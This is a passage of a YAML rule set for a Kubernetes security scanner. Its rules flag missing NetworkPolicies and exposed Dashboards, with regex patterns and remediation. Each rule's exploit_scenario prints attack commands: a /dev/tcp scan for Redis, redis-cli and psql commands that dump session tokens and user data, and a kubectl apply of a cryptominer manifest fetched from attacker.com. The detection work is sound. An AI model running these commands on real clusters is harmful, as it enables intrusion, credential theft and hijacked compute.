  references:
  - https://cwe.mitre.org/data/definitions/250.html
  - https://kubernetes.io/docs/concepts/security/pod-security-standards/
  - https://www.cisecurity.org/benchmark/kubernetes
  - https://man7.org/linux/man-pages/man7/capabilities.7.html
  - https://attack.mitre.org/techniques/T1611/
  metadata:
    rule_version: 2.0.0
    last_reviewed: '2025-01-15'
    rule_maturity_level: stable
    detection_complexity: low
  cross_rule_intelligence:
    cross_file_risk_flag: true
    requires_ai_validation: false
    high_impact_flag: true
    related_rules:
    - DEVOPS-YAML-001
    - DEVOPS-YAML-002
    - DEVOPS-YAML-006
    - DEVOPS-YAML-003
  detection_layer: 1
- rule_id: DEVOPS-YAML-010
  title: Missing Network Policy
  description: 'Detects Kubernetes namespaces and workloads without associated NetworkPolicy resources, allowing unrestricted pod-to-pod communication across the cluster. By default, Kubernetes does not
    enforce any network segmentation, meaning every pod can communicate with every other pod. This flat network model enables lateral movement, data exfiltration, and cross-namespace attacks once an attacker
    compromises a single pod.

    '
  language: yaml
  category: devops
  severity: High
  confidence: 0.88
  cwe: CWE-284
  owasp: A05:2021-Security-Misconfiguration
  tags:
  - kubernetes
  - network-policy
  - network-segmentation
  - lateral-movement
  - zero-trust
  - cis-benchmark
  - microsegmentation
  detection_layer: 1
  attack_surface_type: network
  patterns:
  - type: regex
    pattern: kind\s*:\s*Namespace\s*\n(?:(?!NetworkPolicy).){0,500}
  - type: regex
    pattern: kind\s*:\s*Deployment\s*\n(?:(?!NetworkPolicy).){0,500}
  - type: regex
    pattern: kind\s*:\s*(?:Deployment|StatefulSet|DaemonSet)\s*\n(?:[ \t]+.{0,500}\n){0,20}?\s+namespace\s*:\s*\S+\s*\n(?:(?!NetworkPolicy).){0,500}
  - type: regex
    pattern: apiVersion\s*:\s*apps/v1\s*\nkind\s*:\s*(?:Deployment|StatefulSet)\s*\n(?:(?!networking\.k8s\.io).){0,500}
  - type: regex
    pattern: spec\s*:\s*\n\s+podSelector\s*:\s*\{\s*\}\s*\n\s+policyTypes\s*:\s*\[\s*\]
  anti_patterns:
  - 'kind: NetworkPolicy'
  - networking.k8s.io/v1
  - calico.org/v3
  - GlobalNetworkPolicy
  - cilium.io/v2
  - CiliumNetworkPolicy
  - security.istio.io
  - AuthorizationPolicy
  - gatekeeper.sh/constraint
  - kyverno.io/policy
  bypass_variants:
  - description: Empty network policy that allows all traffic
    pattern: podSelector\s*:\s*\{\s*\}\s*\n\s+policyTypes\s*:\s*\[\s*\]
  - description: Overly permissive ingress rule allowing all sources
    pattern: ingress\s*:\s*\n\s+-\s*\{\s*\}
  - description: Wildcard CIDR block allowing external traffic
    pattern: cidr\s*:\s*0\.0\.0\.0/0
  evasion_indicators:
  - 'podSelector: {}'
  - 'ingress: [{}]'
  - 'egress: [{}]'
  - 'cidr: 0.0.0.0/0'
  encoding_variants:
  - description: Helm template conditional bypassing network policy
    pattern: '{{-\s*if\s+\.Values\.networkPolicy\.enabled\s*}}'
  - description: Kustomize overlay removing network policy
    pattern: \$patch\s*:\s*delete.*NetworkPolicy
  multi_function_chain_patterns:
  - description: Deployment without matching NetworkPolicy in same namespace
    chain:
    - kind\s*:\s*Deployment
    - namespace\s*:\s*\S+
    - no corresponding NetworkPolicy resource
  privilege_context_flags:
    requires_cluster_admin: false
    requires_namespace_admin: true
    network_exposure: unrestricted
  business_logic_indicator:
    data_sensitivity: high
    compliance_relevant: true
    regulatory_frameworks:
    - PCI-DSS
    - SOC2
    - NIST-800-53
  probable_taint_paths:
  - source: Any compromised pod in the cluster
    sink: All other pods via unrestricted network
    propagation: Direct TCP/UDP communication across namespaces
  impact: 'Without NetworkPolicies, all pods can communicate freely with every other

    pod in the cluster, enabling lateral movement after an initial compromise.

    An attacker who gains access to one pod can reach databases, internal APIs,

    and control plane components. This violates CIS Kubernetes Benchmark 5.3.2

    and zero-trust network principles.

    '
  remediation: "## Kubernetes Network Policies\n- Create default-deny NetworkPolicies for each namespace\n- Explicitly allow only required ingress and egress traffic\n- Apply namespace-level isolation as\
    \ a baseline\n\n## Default Deny Policy Template\n```yaml\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: default-deny-all\n  namespace: my-namespace\nspec:\n  podSelector:\
    \ {}\n  policyTypes:\n    - Ingress\n    - Egress\n```\n\n## CIS Benchmark References\n- CIS Kubernetes Benchmark 5.3.2: Ensure that all Namespaces have Network Policies defined\n\n## Additional Remediation\n\
    - Use Calico or Cilium for advanced network policy features\n- Implement DNS-based egress policies to restrict external communication\n- Use Istio AuthorizationPolicy for L7 traffic control\n- Audit\
    \ network policies with kubectl-who-can and network-policy-viewer\n"
  references:
  - https://cwe.mitre.org/data/definitions/284.html
  - https://kubernetes.io/docs/concepts/services-networking/network-policies/
  - https://www.cisecurity.org/benchmark/kubernetes
  - https://attack.mitre.org/techniques/T1046/
  - https://docs.projectcalico.org/security/kubernetes-network-policy
  context_awareness:
    surrounding_context_patterns:
    - 'kind: Namespace'
    - 'kind: Deployment'
    - 'kind: StatefulSet'
    - 'kind: DaemonSet'
    - 'kind: Service'
    - 'metadata:'
    - 'namespace:'
    taint_source_indicators:
    - 'kind: Service'
    - 'type: ClusterIP'
    - 'type: NodePort'
    - 'type: LoadBalancer'
    - 'ports:'
    taint_sink_indicators:
    - no NetworkPolicy in namespace
    - default namespace
    - missing policyTypes
    sanitization_patterns:
    - 'kind: NetworkPolicy'
    - 'podSelector:'
    - 'policyTypes:'
    - calico GlobalNetworkPolicy
    - CiliumNetworkPolicy
    - istio AuthorizationPolicy
  severity_scoring:
    severity_weight: 8
    risk_score_formula_hint: severity_weight * confidence * (1 + exploitability_score) / 2
    exploitability_score: 0.85
  exploit_scenario:
    attack_example: 'Lateral Movement via Flat Network: An attacker exploits an RCE vulnerability in a web-facing pod. Without NetworkPolicies, they scan the internal cluster network, discover a Redis instance
      without authentication on port 6379, dump cached session tokens, and pivot to access the main application database in a different namespace containing customer PII.

      '
    example_payload: "# From compromised pod: scan internal network\nfor i in $(seq 1 254); do\n  timeout 1 bash -c \"echo > /dev/tcp/10.0.0.$i/6379\" 2>/dev/null && echo \"Redis found: 10.0.0.$i\"\ndone\n\
      # Connect to discovered Redis\nredis-cli -h 10.0.0.42 KEYS '*session*'\nredis-cli -h 10.0.0.42 GET session:admin\n# Pivot to database\npsql -h 10.0.1.15 -U app -d production -c \"SELECT * FROM users\
      \ LIMIT 10\"\n"
    attacker_objective: 'Exploit the flat network topology to move laterally between pods, access databases, steal credentials from caches, and exfiltrate sensitive data across namespace boundaries.

      '
  confidence_factors:
    pattern_strength: 0.85
    context_match: 0.88
    proximity_to_user_input: 0.2
    sanitization_absence: 0.9
  metadata:
    rule_version: 3.0.0
    last_reviewed: '2025-01-15'
    rule_maturity_level: stable
    detection_complexity: medium
  cross_rule_intelligence:
    cross_file_risk_flag: true
    requires_ai_validation: true
    high_impact_flag: true
    related_rules:
    - DEVOPS-YAML-003
    - DEVOPS-YAML-001
    - DEVOPS-YAML-014
- rule_id: DEVOPS-YAML-011
  title: Exposed Kubernetes Dashboard
  description: 'Detects Kubernetes Dashboard deployments with insecure configurations such as skip-login enabled, exposed via NodePort or LoadBalancer, cluster-admin role bindings, or missing authentication.
    The Kubernetes Dashboard provides full cluster management capabilities and, when exposed without proper authentication, grants attackers complete control over the cluster including deploying workloads,
    reading secrets, and deleting resources.

    '
  language: yaml
  category: devops
  severity: Critical
  confidence: 0.94
  cwe: CWE-269
  owasp: A05:2021-Security-Misconfiguration
  tags:
  - kubernetes
  - dashboard
  - authentication-bypass
  - cluster-admin
  - cis-benchmark
  - exposed-management
  - unauthorized-access
  detection_layer: 1
  attack_surface_type: management-interface
  patterns:
  - type: regex
    pattern: kubernetes-dashboard\s*\n(?:.*\n){0,20}?--enable-skip-login
  - type: regex
    pattern: args\s*:\s*\n(?:\s+-\s+.*\n){0,15}?\s+-\s+--enable-skip-login
  - type: regex
    pattern: kind\s*:\s*ClusterRoleBinding\s*\n(?:.*\n){0,20}?kubernetes-dashboard(?:.*\n){0,20}?cluster-admin
  - type: regex
    pattern: kind\s*:\s*Service\s*\n(?:.*\n){0,20}?kubernetes-dashboard(?:.*\n){0,20}?type\s*:\s*(?:NodePort|LoadBalancer)
  - type: regex
    pattern: --enable-insecure-login
  - type: regex
    pattern: --authentication-mode\s*=\s*(?:basic|token)\s*\n(?:.*\n){0,20}?--enable-skip-login
  anti_patterns:
  - 'type: ClusterIP'
  - '# internal only'
  - oauth2-proxy
  - dex
  - oidc
  - authentication-mode=token
  - gatekeeper.sh/constraint
  - NetworkPolicy
  - rbac.authorization.k8s.io
  - ingress.kubernetes.io/auth-type
  bypass_variants:
  - description: Dashboard with token auth but overly permissive RBAC
    pattern: ClusterRoleBinding(?:.*\n)*?dashboard(?:.*\n)*?ClusterRole(?:.*\n)*?cluster-admin
  - description: Dashboard exposed through ingress without auth
    pattern: kind\s*:\s*Ingress(?:.*\n)*?dashboard(?:.*\n)*?(?!auth)
  - description: Skip login combined with insecure port binding
    pattern: --enable-skip-login(?:.*\n)*?--insecure-bind-address\s*=\s*0\.0\.0\.0
  evasion_indicators:
  - --enable-skip-login
  - --insecure-bind-address=0.0.0.0
  - --insecure-port
  - 'type: NodePort'
  - cluster-admin
  encoding_variants:
  - description: Helm values enabling skip login
    pattern: dashboard\.skipLogin\s*:\s*true
  - description: Base64 encoded dashboard args in ConfigMap
    pattern: LS0tZW5hYmxlLXNraXAtbG9naW4
  multi_function_chain_patterns:
  - description: Dashboard with skip-login plus cluster-admin binding
    chain:
    - --enable-skip-login
    - ClusterRoleBinding
    - cluster-admin
  - description: Dashboard exposed externally without auth proxy
    chain:
    - kubernetes-dashboard
    - 'type: LoadBalancer'
    - no oauth2-proxy or OIDC
  privilege_context_flags:
    requires_cluster_admin: true
    requires_namespace_admin: false
    network_exposure: external
  business_logic_indicator:
    data_sensitivity: critical
    compliance_relevant: true
    regulatory_frameworks:
    - PCI-DSS
    - SOC2
    - HIPAA
    - NIST-800-53
  probable_taint_paths:
  - source: Externally accessible dashboard URL
    sink: Kubernetes API server via dashboard proxy
    propagation: Unauthenticated web request to full cluster admin
  impact: 'An exposed Kubernetes Dashboard with skip-login or cluster-admin

    privileges gives any network-accessible user full control over

    the entire cluster. Attackers can deploy cryptominers, read all

    secrets including TLS certificates and database credentials,

    delete critical workloads, and establish persistent backdoors.

    The Tesla cryptojacking incident (2018) was caused by exactly

    this misconfiguration.

    '
  remediation: "## Secure Dashboard Configuration\n- Remove --enable-skip-login flag\n- Remove --enable-insecure-login flag\n- Use token-based authentication with RBAC\n- Never bind the dashboard ClusterRoleBinding\
    \ to cluster-admin\n\n## Access Control\n- Use kubectl proxy for local access instead of NodePort/LoadBalancer\n- Deploy an OAuth2 proxy (e.g., oauth2-proxy, dex) in front of the dashboard\n- Bind dashboard\
    \ ServiceAccount to namespace-scoped roles only\n\n## CIS Benchmark References\n- CIS Kubernetes Benchmark 1.2.6: Ensure that the --enable-admission-plugins argument includes NodeRestriction\n- Restrict\
    \ dashboard access to cluster administrators only\n\n## OPA Rego Policy\n```rego\npackage kubernetes.admission\ndeny[msg] {\n  input.request.kind.kind == \"Deployment\"\n  contains(input.request.object.metadata.name,\
    \ \"dashboard\")\n  args := input.request.object.spec.template.spec.containers[_].args\n  arg := args[_]\n  contains(arg, \"--enable-skip-login\")\n  msg := \"Dashboard skip-login must not be enabled\"\
    \n}\n```\n\n## Additional Remediation\n- Consider removing the dashboard entirely in production\n- Use Lens, k9s, or headlamp as safer alternatives\n- Apply NetworkPolicy to restrict dashboard access\
    \ to admin CIDRs only\n"
  references:
  - https://cwe.mitre.org/data/definitions/269.html
  - https://kubernetes.io/docs/tasks/access-application-cluster/web-ui-dashboard/
  - https://www.cisecurity.org/benchmark/kubernetes
  - https://attack.mitre.org/techniques/T1078/
  - https://redlock.io/blog/cryptojacking-tesla
  context_awareness:
    surrounding_context_patterns:
    - kubernetes-dashboard
    - 'kind: Deployment'
    - 'kind: Service'
    - 'kind: ClusterRoleBinding'
    - 'kind: Ingress'
    - dashboard
    - 'args:'
    taint_source_indicators:
    - values.yaml
    - helm template
    - '{{ .Values.dashboard'
    - skipLogin
    - enableInsecureLogin
    taint_sink_indicators:
    - --enable-skip-login
    - --enable-insecure-login
    - cluster-admin
    - 'type: NodePort'
    - 'type: LoadBalancer'
    sanitization_patterns:
    - 'type: ClusterIP'
    - oauth2-proxy
    - dex
    - oidc
    - NetworkPolicy
    - ingress auth annotation
  severity_scoring:
    severity_weight: 10
    risk_score_formula_hint: severity_weight * confidence * (1 + exploitability_score) / 2
    exploitability_score: 0.96
  exploit_scenario:
    attack_example: 'Dashboard Takeover for Cluster Compromise: An attacker discovers the Kubernetes Dashboard exposed on a NodePort (e.g., port 30443) via an internet scan. With --enable-skip-login enabled
      and a cluster-admin ClusterRoleBinding, they click "Skip" on the login page and gain full administrative access to the cluster. They deploy a cryptominer DaemonSet across all nodes, exfiltrate all
      Secrets, and create a backdoor ServiceAccount with long-lived tokens.

      '
    example_payload: "# Discover exposed dashboard\nnmap -p 30000-32767 target-cluster.example.com\n# Access dashboard without authentication\ncurl -k https://target-cluster.example.com:30443/\n# Via dashboard\
      \ API: list all secrets\ncurl -k https://target-cluster.example.com:30443/api/v1/secret/default\n# Deploy cryptominer via dashboard\nkubectl --server=https://target-cluster.example.com:30443 \\\n\
      \  apply -f https://attacker.com/miner-daemonset.yaml\n"
    attacker_objective: 'Gain full cluster administrative access through the unauthenticated dashboard to deploy malicious workloads, steal secrets and credentials, and establish persistent backdoor access.

      '
  confidence_factors:
    pattern_strength: 0.95
    context_match: 0.94
    proximity_to_user_input: 0.4
    sanitization_absence: 0.94
  metadata:
